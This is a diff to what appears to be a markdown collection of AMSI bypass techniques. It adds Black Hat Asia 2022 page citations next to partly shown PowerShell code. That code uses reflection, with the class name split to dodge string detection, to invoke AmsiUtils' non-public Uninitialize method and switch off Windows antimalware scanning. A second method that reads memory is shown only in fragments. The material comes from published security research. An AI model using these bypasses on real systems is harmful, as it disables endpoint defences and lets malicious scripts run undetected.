@@ -30,6 +30,8 @@ $object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
 $Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
 $Uninitialize.Invoke($object,$null)
 ```
+AMSI Bypass created By Maor Korkos https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf | Page 43
+
 
 ### 2nd Method by Maor Korkos
 ---
@@ -52,4 +54,4 @@ $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt32($Ant
 }
 ```
 
-AMSI Bypass created By Maor Korkos https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf
+AMSI Bypass created By Maor Korkos https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf | Page 51
